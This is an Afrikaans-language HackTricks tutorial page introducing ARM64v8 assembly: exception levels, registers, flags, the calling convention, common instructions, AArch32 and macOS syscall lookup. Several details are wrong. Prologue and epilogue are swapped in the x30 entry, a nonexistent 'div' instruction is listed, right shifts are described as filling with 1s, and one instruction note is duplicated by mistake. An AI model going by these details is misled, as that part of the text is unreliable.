# Inleiding tot ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Uitsonderingsvlakke - EL (ARM64v8)**

In ARMv8-argitektuur definieer uitvoeringsvlakke, bekend as Exception Levels (ELs), die privilegievlak en vermoens van die uitvoeringsomgewing. Daar is vier uitsonderingsvlakke, van EL0 tot EL3, en elkeen dien 'n verskillende doel:

1. **EL0 - Gebruikersmodus**:
- Dit is die vlak met die minste privilegies en word gebruik om gewone application code uit te voer.
- Applications wat op EL0 loop, is van mekaar en van die system software geisoleer, wat sekuriteit en stabiliteit verbeter.
2. **EL1 - Operating System Kernel Mode**:
- Die meeste operating system kernels loop op hierdie vlak.
- EL1 het meer privilegies as EL0 en kan toegang tot system resources verkry, maar met sekere beperkings om system integrity te verseker. Jy beweeg van EL0 na EL1 met die SVC-instruction.
3. **EL2 - Hypervisor Mode**:
- Hierdie vlak word vir virtualization gebruik. 'n Hypervisor wat op EL2 loop, kan verskeie operating systems (elk in sy eie EL1) bestuur wat op dieselfde fisiese hardware loop.
- EL2 verskaf features vir isolasie en beheer van die gevirtualiseerde omgewings.
- Virtual machine applications soos Parallels kan dus die `hypervisor.framework` gebruik om met EL2 te kommunikeer en virtual machines te laat loop sonder dat kernel extensions nodig is.
- Om van EL1 na EL2 te beweeg, word die `HVC`-instruction gebruik.
4. **EL3 - Secure Monitor Mode**:
- Dit is die vlak met die meeste privilegies en word dikwels vir secure booting en trusted execution environments gebruik.
- EL3 kan toegang tussen secure en non-secure states bestuur en beheer (soos secure boot, trusted OS, ens.).
- Dit is vir KPP (Kernel Patch Protection) in macOS gebruik, maar word nie meer gebruik nie.
- EL3 word nie meer deur Apple gebruik nie.
- Die oorgang na EL3 word tipies met die `SMC` (Secure Monitor Call)-instruction gedoen.

Die gebruik van hierdie vlakke bied 'n gestruktureerde en veilige manier om verskillende aspekte van die stelsel te bestuur, van user applications tot die mees bevoorregte system software. ARMv8 se benadering tot privilege levels help om verskillende system components effektief te isoleer en verbeter sodoende die sekuriteit en robuustheid van die stelsel.

## **Registers (ARM64v8)**

ARM64 het **31 general-purpose registers**, gemerk `x0` tot `x30`. Elkeen kan 'n **64-bit** (8-byte) waarde stoor. Vir bewerkings wat slegs 32-bit-waardes benodig, kan dieselfde registers in 'n 32-bit-modus verkry word deur die name w0 tot w30 te gebruik.

1. **`x0`** tot **`x7`** - Hierdie registers word tipies as scratch registers en vir die deurgee van parameters aan subroutines gebruik.
- **`x0`** bevat ook die return data van 'n funksie
2. **`x8`** - In die Linux-kernel word `x8` as die system call number vir die `svc`-instruction gebruik. **In macOS is x16 die register wat gebruik word!**
3. **`x9`** tot **`x15`** - Nog temporary registers, wat dikwels vir local variables gebruik word.
4. **`x16`** en **`x17`** - **Intra-procedural Call Registers**. Temporary registers vir immediate values. Hulle word ook vir indirect function calls en PLT (Procedure Linkage Table)-stubs gebruik.
- **`x16`** word as die **system call number** vir die **`svc`**-instruction in **macOS** gebruik.
5. **`x18`** - **Platform register**. Dit kan as 'n general-purpose register gebruik word, maar op sommige platforms is hierdie register vir platform-specific uses gereserveer: 'n Pointer na die huidige thread environment block in Windows, of om na die tans **executing task structure in the Linux-kernel** te wys.
6. **`x19`** tot **`x28`** - Hierdie is callee-saved registers. 'n Funksie moet hierdie registers se waardes vir sy caller behou, dus word hulle op die stack gestoor en herstel voordat daar na die caller teruggekeer word.
7. **`x29`** - **Frame pointer** om die stack frame dop te hou. Wanneer 'n nuwe stack frame geskep word omdat 'n funksie geroep word, word die **`x29`**-register **op die stack gestoor** en die adres van die **nuwe** frame pointer ((**`sp`**-adres)) word **in hierdie register gestoor**.
- Hierdie register kan ook as 'n **general-purpose register** gebruik word, hoewel dit gewoonlik as verwysing na **local variables** gebruik word.
8. **`x30`** of **`lr`**- **Link register**. Dit bevat die **return address** wanneer 'n `BL` (Branch with Link)- of `BLR` (Branch with Link to Register)-instruction uitgevoer word, deur die **`pc`**-waarde in hierdie register te stoor.
- Dit kan ook soos enige ander register gebruik word.
- As die huidige funksie 'n nuwe funksie gaan roep en dus `lr` gaan oorskryf, sal dit dit aan die begin in die stack stoor; dit is die epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` en `lr`, skep spasie en kry nuwe `fp`) en dit aan die einde herstel; dit is die prologue (`ldp x29, x30, [sp], #48; ret` -> Herstel `fp` en `lr` en keer terug).
9. **`sp`** - **Stack pointer**, wat gebruik word om die bokant van die stack dop te hou.
- Die **`sp`**-waarde moet altyd ten minste op **quadword**-**alignment** gehou word, anders kan 'n alignment exception voorkom.
10. **`pc`** - **Program counter**, wat na die volgende instruction wys. Hierdie register kan slegs deur exception generations, exception returns en branches opgedateer word. Die enigste ordinary instructions wat hierdie register kan lees, is branch with link-instructions (BL, BLR), om die **`pc`**-adres in **`lr`** (Link Register) te stoor.
11. **`xzr`** - **Zero register**. Dit word ook **`wzr`** in sy **32**-bit-registervorm genoem. Dit kan gebruik word om maklik die zero value te verkry ( 'n algemene bewerking) of om comparisons met **`subs`** uit te voer, soos **`subs XZR, Xn, #10`**, wat die resulterende data nêrens stoor nie (in **`xzr`**).

Die **`Wn`**-registers is die **32bit**-weergawe van die **`Xn`**-register.

> [!TIP]
> Die registers van X0 - X18 is volatile, wat beteken dat hulle waardes deur function calls en interrupts verander kan word. Die registers van X19 - X28 is egter non-volatile, wat beteken dat hulle waardes oor function calls behoue moet bly ("callee saved").

### SIMD en Floating-Point Registers

Daar is boonop nog **32 registers van 128bit-lengte** wat in geoptimaliseerde single instruction multiple data (SIMD)-bewerkings en vir floating-point arithmetic gebruik kan word. Hulle word die Vn-registers genoem, hoewel hulle ook in **64**-bit-, **32**-bit-, **16**-bit- en **8**-bit-modusse kan werk, waarna hulle **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** en **`Bn`** genoem word.

### System Registers

**Daar is honderde system registers**, ook bekend as special-purpose registers (SPRs), wat vir die **monitering** en **beheer** van **processors** se gedrag gebruik word.\
Hulle kan slegs met die toegewyde spesiale instructions **`mrs`** en **`msr`** gelees of gestel word.

Die spesiale registers **`TPIDR_EL0`** en **`TPIDDR_EL0`** word algemeen tydens reverse engineering gevind. Die `EL0`-suffix dui die **minimum exception level** aan waarvandaan die register verkry kan word (in hierdie geval is EL0 die gewone exception (privilege)-level waarmee gewone programme loop).\
Hulle word dikwels gebruik om die **base address van die thread-local storage**-geheuestreek te stoor. Gewoonlik is die eerste een leesbaar en skryfbaar vir programme wat in EL0 loop, maar die tweede een kan vanaf EL0 gelees en vanaf EL1 (soos die kernel) geskryf word.

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** bevat verskeie proseskomponente wat in die operating-system-sigbare **`SPSR_ELx`**-spesialeregister geserialiseer is, waar X die **permission**-**level van die getriggerde** exception is (dit laat toe dat die proses se toestand herstel word wanneer die exception eindig).\
Hierdie is die toeganklike velde:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Die **`N`**, **`Z`**, **`C`** en **`V`** condition flags:
- **`N`** beteken die bewerking het 'n negatiewe resultaat opgelewer
- **`Z`** beteken die bewerking het zero opgelewer
- **`C`** beteken die bewerking het 'n carry gehad
- **`V`** beteken die bewerking het 'n signed overflow opgelewer:
- Die som van twee positiewe getalle lewer 'n negatiewe resultaat.
- Die som van twee negatiewe getalle lewer 'n positiewe resultaat.
- In subtraction, wanneer 'n groot negatiewe getal van 'n kleiner positiewe getal afgetrek word (of andersom), en die resultaat nie binne die reeks van die gegewe bit size voorgestel kan word nie.
- Die processor weet natuurlik nie of die bewerking signed of unsigned is nie, dus sal dit C en V in die bewerkings nagaan en aandui of 'n carry plaasgevind het indien dit signed of unsigned was.

> [!WARNING]
> Nie alle instructions dateer hierdie flags op nie. Sommige, soos **`CMP`** of **`TST`**, doen dit, en ander met 'n s-suffix, soos **`ADDS`**, doen dit ook.

- Die huidige **register width (`nRW`) flag**: As die flag die waarde 0 bevat, sal die program in die AArch64 execution state loop wanneer dit hervat word.
- Die huidige **Exception Level** (**`EL`**): 'n Gewone program wat in EL0 loop, sal die waarde 0 hê
- Die **single stepping**-flag (**`SS`**): Word deur debuggers gebruik om single step uit te voer deur die SS-flag in **`SPSR_ELx`** deur middel van 'n exception op 1 te stel. Die program sal een step loop en 'n single step exception genereer.
- Die **illegal exception**-state-flag (**`IL`**): Dit word gebruik om aan te dui wanneer privileged software 'n ongeldige exception level transfer uitvoer; hierdie flag word op 1 gestel en die processor trigger 'n illegal state exception.
- Die **`DAIF`**-flags: Hierdie flags laat 'n privileged program toe om sekere external exceptions selektief te mask.
- As **`A`** 1 is, beteken dit dat **asynchronous aborts** getrigger sal word. Die **`I`** konfigureer reaksie op external hardware **Interrupts Requests** (IRQs), en die F hou verband met **Fast Interrupt Requests** (FIRs).
- Die **stack pointer select**-flags (**`SPS`**): Privileged programs wat in EL1 en hoer loop, kan wissel tussen die gebruik van hul eie stack pointer-register en die user-model-een (bv. tussen `SP_EL1` en `EL0`). Hierdie wisseling word uitgevoer deur na die **`SPSel`**-spesialeregister te skryf. Dit kan nie vanaf EL0 gedoen word nie.

## **Calling Convention (ARM64v8)**

Die ARM64 calling convention spesifiseer dat die **eerste agt parameters** aan 'n funksie in registers **`x0`** tot **`x7`** deurgegee word. **Bykomende** parameters word op die **stack** deurgegee. Die **return**-waarde word in register **`x0`** teruggegee, of ook in **`x1`** **as dit 128 bits lank is**. Die **`x19`** tot **`x30`**- en **`sp`**-registers moet oor function calls heen **behoue bly**.

Wanneer jy 'n funksie in assembly lees, soek die **function prologue en epilogue**. Die **prologue** behels gewoonlik die **stoor van die frame pointer (`x29`)**, die **opstel** van 'n **nuwe frame pointer**, en die **toewys van stack space**. Die **epilogue** behels gewoonlik die **herstel van die gestoorde frame pointer** en die **terugkeer** uit die funksie.

### Calling Convention in Swift

Swift het sy eie **calling convention**, wat gevind kan word by [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

ARM64-instructions het oor die algemeen die **formaat `opcode dst, src1, src2`**, waar **`opcode`** die **bewerking** is wat uitgevoer moet word (soos `add`, `sub`, `mov`, ens.), **`dst`** die **destination**-register is waar die resultaat gestoor word, en **`src1`** en **`src2`** die **source**-registers is. Immediate values kan ook in die plek van source registers gebruik word.

- **`mov`**: **Move** 'n waarde van een **register** na 'n ander.
- Example: `mov x0, x1` — Dit skuif die waarde van `x1` na `x0`.
- **`ldr`**: **Load** 'n waarde uit **memory** in 'n **register**.
- Example: `ldr x0, [x1]` — Dit laai 'n waarde vanaf die memory location waarna `x1` wys, in `x0`.
- **Offset mode**: 'n Offset wat die origin pointer beinvloed, word byvoorbeeld aangedui deur:
- `ldr x2, [x1, #8]`, dit laai die waarde vanaf x1 + 8 in x2
- `ldr x2, [x0, x1, lsl #2]`, dit laai 'n object vanaf die array x0 op die x1-posisie (index) \* 4 in x2
- **Pre-indexed mode**: Dit pas calculations op die origin toe, verkry die resultaat en stoor ook die nuwe origin in die origin.
- `ldr x2, [x1, #8]!`, dit laai `x1 + 8` in `x2` en stoor die resultaat van `x1 + 8` in x1
- `str lr, [sp, #-4]!`, Stoor die link register in sp en dateer die register sp op
- **Post-index mode**: Dit is soos die vorige een, maar die memory address word verkry en daarna word die offset bereken en gestoor.
- `ldr x0, [x1], #8`, laai `x1` in `x0` en dateer x1 op met `x1 + 8`
- **PC-relative addressing**: In hierdie geval word die adres om te laai relatief tot die PC-register bereken
- `ldr x1, =_start`, Dit laai die adres waar die `_start`-symbol begin in x1 relatief tot die huidige PC.
- **`str`**: **Store** 'n waarde vanaf 'n **register** in **memory**.
- Example: `str x0, [x1]` — Dit stoor die waarde in `x0` in die memory location waarna `x1` wys.
- **`ldp`**: **Load Pair of Registers**. Hierdie instruction **laai twee registers** vanaf **opeenvolgende memory**-locations. Die memory address word tipies gevorm deur 'n offset by die waarde in 'n ander register te tel.
- Example: `ldp x0, x1, [x2]` — Dit laai `x0` en `x1` vanaf die memory locations by `x2` en `x2 + 8`, onderskeidelik.
- **`stp`**: **Store Pair of Registers**. Hierdie instruction **stoor twee registers** in **opeenvolgende memory**-locations. Die memory address word tipies gevorm deur 'n offset by die waarde in 'n ander register te tel.
- Example: `stp x0, x1, [sp]` — Dit stoor `x0` en `x1` in die memory locations by `sp` en `sp + 8`, onderskeidelik.
- `stp x0, x1, [sp, #16]!` — Dit stoor `x0` en `x1` in die memory locations by `sp+16` en `sp + 24`, onderskeidelik, en dateer `sp` op met `sp+16`.
- **`add`**: **Tel** die waardes van twee registers bymekaar en stoor die resultaat in 'n register.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operando 2 (register or immediate)
- \[shift #N | RRX] -> Perform a shift or call RRX
- Example: `add x0, x1, x2` — Dit tel die waardes in `x1` en `x2` bymekaar en stoor die resultaat in `x0`.
- `add x5, x5, #1, lsl #12` — Dit is gelyk aan 4096 (a 1 shifter 12 times) -> 1 0000 0000 0000 0000
- **`adds`** Hierdie voer 'n `add` uit en dateer die flags op
- **`sub`**: **Trek** die waardes van twee registers af en stoor die resultaat in 'n register.
- Sien **`add`** **syntax**.
- Example: `sub x0, x1, x2` — Dit trek die waarde in `x2` van `x1` af en stoor die resultaat in `x0`.
- **`subs`** Dit is soos sub, maar dateer die flags op
- **`mul`**: **Vermenigvuldig** die waardes van **twee registers** en stoor die resultaat in 'n register.
- Example: `mul x0, x1, x2` — Dit vermenigvuldig die waardes in `x1` en `x2` en stoor die resultaat in `x0`.
- **`div`**: **Deel** die waarde van een register deur 'n ander en stoor die resultaat in 'n register.
- Example: `div x0, x1, x2` — Dit deel die waarde in `x1` deur `x2` en stoor die resultaat in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Voeg 0s aan die einde by terwyl die ander bits vorentoe geskuif word (vermenigvuldig met n-keer 2)
- **Logical shift right**: Voeg 1s aan die begin by terwyl die ander bits agtertoe geskuif word (deel deur n-keer 2 in unsigned)
- **Arithmetic shift right**: Soos **`lsr`**, maar in plaas daarvan om 0s by te voeg wanneer die most significant bit 'n 1 is, word **1s bygevoeg (**deel deur n-keer 2 in signed)
- **Rotate right**: Soos **`lsr`**, maar wat ook al van regs verwyder word, word aan die linkerkant aangeheg
- **Rotate Right with Extend**: Soos **`ror`**, maar met die carry flag as die "most significant bit". Die carry flag word dus na bit 31 geskuif en die verwyderde bit na die carry flag.
- **`bfm`**: **Bit Field Move**; hierdie bewerkings **kopieer bits `0...n`** vanaf 'n waarde en plaas hulle in posisies **`m..m+n`**. Die **`#s`** spesifiseer die **leftmost bit**-posisie en **`#r`** die rotate right-hoeveelheid.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopieer 'n bitfield vanaf 'n register en kopieer dit na 'n ander register.
- **`BFI X1, X2, #3, #4`** Insert 4 bits from X2 from the 3rd bit of X1
- **`BFXIL X1, X2, #3, #4`** Extract from the 3rd bit of X2 four bits and copy them to X1
- **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bits from X2 and inserts them into X1 starting at bit position 3 zeroing the right bits
- **`SBFX X1, X2, #3, #4`** Extracts 4 bits starting at bit 3 from X2, sign extends them, and places the result in X1
- **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bits from X2 and inserts them into X1 starting at bit position 3 zeroing the right bits
- **`UBFX X1, X2, #3, #4`** Extracts 4 bits starting at bit 3 from X2 and places the zero-extended result in X1.
- **Sign Extend To X:** Brei die sign uit (of voeg slegs 0s in die unsigned-weergawe by) van 'n waarde om bewerkings daarmee te kan uitvoer:
- **`SXTB X1, W2`** Brei die sign van 'n byte **van W2 na X1** uit (`W2` is die helfte van `X2`) om die 64bits te vul
- **`SXTH X1, W2`** Brei die sign van 'n 16bit-getal **van W2 na X1** uit om die 64bits te vul
- **`SXTW X1, W2`** Brei die sign van 'n byte **van W2 na X1** uit om die 64bits te vul
- **`UXTB X1, W2`** Voeg 0s (unsigned) by 'n byte **van W2 na X1** om die 64bits te vul
- **`extr`:** Onttrek bits uit 'n gespesifiseerde **paar registers wat aaneengeskakel is**.
- Example: `EXTR W3, W2, W1, #3` Dit sal **W1+W2 concat** en **vanaf bit 3 van W2 tot by bit 3 van W1** verkry en dit in W3 stoor.
- **`cmp`**: **Vergelyk** twee registers en stel condition flags. Dit is 'n **alias van `subs`** wat die destination register op die zero register stel. Nuttig om te weet of `m == n`.
- Dit ondersteun dieselfde syntax as `subs`
- Example: `cmp x0, x1` — Dit vergelyk die waardes in `x0` en `x1` en stel die condition flags dienooreenkomstig.
- **`cmn`**: **Compare negative** operand. In hierdie geval is dit 'n **alias van `adds`** en ondersteun dit dieselfde syntax. Nuttig om te weet of `m == -n`.
- **`ccmp`**: Conditional comparison; dit is 'n comparison wat slegs uitgevoer word as 'n vorige comparison waar was en wat die nzcv-bits spesifiek stel.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> as x1 != x2 en x3 < x4, spring na func
- Dit is omdat **`ccmp`** slegs uitgevoer word as die **vorige `cmp` 'n `NE` was**; indien nie, word die `nzcv`-bits op 0 gestel (wat nie aan die `blt`-comparison sal voldoen nie).
- Dit kan ook as `ccmn` gebruik word (dieselfde maar negatief, soos `cmp` teenoor `cmn`).
- **`tst`**: Dit kontroleer of enige van die waardes in die comparison albei 1 is (dit werk soos 'n ANDS sonder om die resultaat êrens te stoor). Dit is nuttig om 'n register met 'n waarde te kontroleer en te bepaal of enige van die bits in die register wat deur die waarde aangedui word, 1 is.
- Example: `tst X1, #7` Kontroleer of enige van die laaste 3 bits van X1 1 is
- **`teq`**: XOR-bewerking wat die resultaat weggooi
- **`b`**: Unconditional Branch
- Example: `b myFunction`
- Let daarop dat dit nie die link register met die return address sal vul nie (nie geskik vir subroutine calls wat moet terugkeer nie)
- **`bl`**: **Branch** with link, gebruik om 'n **subroutine** te **roep**. Stoor die **return address in `x30`**.
- Example: `bl myFunction` — Dit roep die funksie `myFunction` en stoor die return address in `x30`.
- Let daarop dat dit nie die link register met die return address sal vul nie (nie geskik vir subroutine calls wat moet terugkeer nie)
- **`blr`**: **Branch** with Link to Register, gebruik om 'n **subroutine** te **roep** waar die target in 'n **register** gespesifiseer word. Stoor die return address in `x30`. (This is
- Example: `blr x1` — Dit roep die funksie waarvan die adres in `x1` vervat is en stoor die return address in `x30`.
- **`ret`**: **Return** van 'n **subroutine**, tipies deur die adres in **`x30`** te gebruik.
- Example: `ret` — Dit keer terug vanaf die huidige subroutine deur die return address in `x30` te gebruik.
- **`b.<cond>`**: Conditional branches
- **`b.eq`**: **Branch if equal**, gebaseer op die vorige `cmp`-instruction.
- Example: `b.eq label` — As die vorige `cmp`-instruction twee gelyke waardes gevind het, spring dit na `label`.
- **`b.ne`**: **Branch if Not Equal**. Hierdie instruction kontroleer die condition flags (wat deur 'n vorige comparison-instruction gestel is), en as die vergelykte waardes nie gelyk was nie, spring dit na 'n label of address.
- Example: Na 'n `cmp x0, x1`-instruction, `b.ne label` — As die waardes in `x0` en `x1` nie gelyk was nie, spring dit na `label`.
- **`cbz`**: **Compare and Branch on Zero**. Hierdie instruction vergelyk 'n register met zero, en as hulle gelyk is, spring dit na 'n label of address.
- Example: `cbz x0, label` — As die waarde in `x0` zero is, spring dit na `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Hierdie instruction vergelyk 'n register met zero, en as hulle nie gelyk is nie, spring dit na 'n label of address.
- Example: `cbnz x0, label` — As die waarde in `x0` nie-zero is nie, spring dit na `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Example: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Example: `tbz x0, #8, label`
- **Conditional select operations**: Dit is bewerkings waarvan die gedrag volgens die conditional bits wissel.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> As waar, X0 = X1; as vals, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> As waar, Xd = Xn; as vals, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> As waar, Xd = Xn + 1; as vals, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> As waar, Xd = Xn; as vals, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> As waar, Xd = NOT(Xn); as vals, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> As waar, Xd = Xn; as vals, Xd = - Xm
- `cneg Xd, Xn, cond` -> As waar, Xd = - Xn; as vals, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> As waar, Xd = 1; as vals, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> As waar, Xd = \<all 1>; as vals, Xd = 0
- **`adrp`**: Bereken die **page address van 'n symbol** en stoor dit in 'n register.
- Example: `adrp x0, symbol` — Dit bereken die page address van `symbol` en stoor dit in `x0`.
- **`ldrsw`**: **Load** 'n signed **32-bit**-waarde uit memory en **sign-extend dit na 64** bits. Dit word vir algemene SWITCH-cases gebruik.
- Example: `ldrsw x0, [x1]` — Dit laai 'n signed 32-bit-waarde vanaf die memory location waarna `x1` wys, sign-extend dit na 64 bits en stoor dit in `x0`.
- **`stur`**: **Store 'n register value na 'n memory location**, deur 'n offset vanaf 'n ander register te gebruik.
- Example: `stur x0, [x1, #4]` — Dit stoor die waarde in `x0` in die memory address wat 4 bytes groter is as die address wat tans in `x1` is.
- **`svc`** : Maak 'n **system call**. Dit staan vir "Supervisor Call". Wanneer die processor hierdie instruction uitvoer, **skakel dit van user mode na kernel mode** en spring dit na 'n spesifieke memory location waar die **kernel se system call handling**-code is.

- Example:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Stoor die link register en frame pointer op die stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Stel die nuwe frame pointer op**: `mov x29, sp` (stel die nuwe frame pointer vir die huidige funksie op)
3. **Ken ruimte op die stack vir plaaslike veranderlikes toe** (indien nodig): `sub sp, sp, <size>` (waar `<size>` die aantal benodigde grepe is)

### **Funksie-epiloog**

1. **Maak plaaslike veranderlikes vry (indien enige toegewys is)**: `add sp, sp, <size>`
2. **Herstel die link register en frame pointer**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (gee beheer terug aan die caller deur die adres in die link register te gebruik)

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A ondersteun die uitvoering van 32-bit-programme. **AArch32** kan in een van **twee instruction sets** loop: **`A32`** en **`T32`**, en kan tussen hulle wissel deur middel van **`interworking`**.\
**Privileged** 64-bit-programme kan die **uitvoering van 32-bit**-programme skeduleer deur ’n exception level transfer na die laer privileged 32-bit-vlak uit te voer.\
Let daarop dat die oorgang van 64-bit na 32-bit plaasvind saam met ’n verlaging van die exception level (byvoorbeeld ’n 64-bit-program in EL1 wat ’n program in EL0 aktiveer). Dit word gedoen deur **bit 4 van** die **`SPSR_ELx`**-special register **op 1 te stel** wanneer die `AArch32`-proses se thread gereed is om uitgevoer te word, terwyl die res van `SPSR_ELx` die **`AArch32`**-program se CPSR stoor. Daarna roep die privileged-proses die **`ERET`**-instruksie aan, sodat die verwerker na **`AArch32`** oorgaan en A32 of T32 betree, afhangend van CPSR**.**

Die **`interworking`** vind plaas deur die J- en T-bits van CPSR te gebruik. `J=0` en `T=0` beteken **`A32`**, terwyl `J=0` en `T=1` **T32** beteken. Dit kom basies daarop neer dat die **laagste bit op 1 gestel word** om aan te dui dat die instruction set T32 is.\
Dit word tydens die **interworking branch instructions** gestel, maar kan ook direk met ander instruksies gestel word wanneer die PC as die destination register gebruik word. Voorbeeld:

Nog ’n voorbeeld:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

Daar is 16 32-bis-registers (r0-r15). **Van r0 tot r14** kan hulle vir **enige bewerking** gebruik word, maar sommige daarvan word gewoonlik gereserveer:

- **`r15`**: Programteller (altyd). Bevat die adres van die volgende instruksie. In A32 huidig + 8, in T32 huidig + 4.
- **`r11`**: Raamwyser
- **`r12`**: Intra-prosedurele oproepregister
- **`r13`**: Stapelwyser (Let daarop dat die stapel altyd 16-grepe-belyn is)
- **`r14`**: Skakelregister

Verder word registers in **`banked registries`** gerugsteun. Dit is plekke wat die registerwaardes stoor en **vinnige kontekstwisseling** tydens uitsonderingshantering en bevoorregte bewerkings moontlik maak, sodat registers nie elke keer handmatig gestoor en herstel hoef te word nie.\
Dit word gedoen deur **die verwerkerstatus van die `CPSR` na die `SPSR`** van die verwerkermodus waarheen die uitsondering geneem word, te stoor. Wanneer daar van die uitsondering teruggekeer word, word die **`CPSR`** vanaf die **`SPSR`** herstel.

### CPSR - Huidige Programstatusregister

In AArch32 werk die CPSR soortgelyk aan **`PSTATE`** in AArch64 en word dit ook in **`SPSR_ELx`** gestoor wanneer ’n uitsondering geneem word, sodat die uitvoering later herstel kan word:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Die velde word in sommige groepe verdeel:

- Application Program Status Register (APSR): Rekenkundige vlae en toeganklik vanaf EL0
- Execution State Registers: Prosesgedrag (deur die OS bestuur).

#### Application Program Status Register (APSR)

- Die **`N`**, **`Z`**, **`C`**, **`V`**-vlae (net soos in AArch64)
- Die **`Q`**-vlag: Dit word op 1 gestel wanneer **heelgetalversadiging** tydens die uitvoering van ’n gespesialiseerde versadigde rekenkundige instruksie plaasvind. Sodra dit op **`1`** gestel is, behou dit die waarde totdat dit handmatig op 0 gestel word. Daarbenewens is daar geen instruksie wat die waarde daarvan implisiet nagaan nie; dit moet gedoen word deur dit handmatig te lees.
- **`GE`**-vlae (Greater than or equal): Dit word in SIMD-bewerkings (Single Instruction, Multiple Data) gebruik, soos “parallel add” en “parallel subtract”. Hierdie bewerkings maak dit moontlik om verskeie datapunte in ’n enkele instruksie te verwerk.

Die **`UADD8`**-instruksie **tel vier pare grepe** (van twee 32-bis-operande) parallel by en stoor die resultate in ’n 32-bis-register. Dit **stel dan die `GE`-vlae in die `APSR`** op grond van hierdie resultate. Elke GE-vlag stem ooreen met een van die greepoptellings en dui aan of die optelling vir daardie greep-paar **oorloop** het.

Die **`SEL`**-instruksie gebruik hierdie GE-vlae om voorwaardelike aksies uit te voer.

#### Execution State Registers

- Die **`J`**- en **`T`**-bisse: **`J`** moet 0 wees. As **`T`** 0 is, word die A32-instruksiestel gebruik, en as dit 1 is, word T32 gebruik.
- **IT Block State Register** (`ITSTATE`): Dit is die bisse van 10-15 en 25-26. Hulle stoor toestande vir instruksies binne ’n groep met ’n **`IT`**-voorvoegsel.
- **`E`**-bis: Dui die **endianness** aan.
- **Mode and Exception Mask Bits** (0-4): Hulle bepaal die huidige uitvoeringstoestand. Die 5de een dui aan of die program as 32-bis (’n 1) of 64-bis (’n 0) loop. Die ander 4 stel die **uitsonderingsmodus wat tans gebruik word** voor (wanneer ’n uitsondering plaasvind en dit hanteer word). Die ingestelde getal **dui die huidige prioriteit aan** ingeval nog ’n uitsondering geaktiveer word terwyl hierdie een hanteer word.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Sekere uitsonderings kan met die bisse **`A`**, `I`, `F` gedeaktiveer word. As **`A`** 1 is, beteken dit dat **asynchrone afbrekings** geaktiveer sal word. Die **`I`** stel die reaksie op eksterne hardeware-**Interrupts Requests** (IRQ’s) op. En die F hou verband met **Fast Interrupt Requests** (FIR’s).

## macOS

### BSD syscalls

Kyk na [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) of voer `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` uit. BSD syscalls sal **x16 > 0** hê.

### Mach Traps

Kyk in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) na die `mach_trap_table` en in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) na die prototipes. Die maksimum aantal Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps sal **x16 < 0** hê, dus moet jy die nommers uit die vorige lys met ’n **minus** oproep: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

Jy kan ook **`libsystem_kernel.dylib`** in ’n disassembler nagaan om te sien hoe om hierdie (en BSD) syscalls aan te roep:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Let daarop dat **Ida** en **Ghidra** ook **specific dylibs** uit die cache kan decompileer deur eenvoudig die cache deur te gee.

> [!TIP]
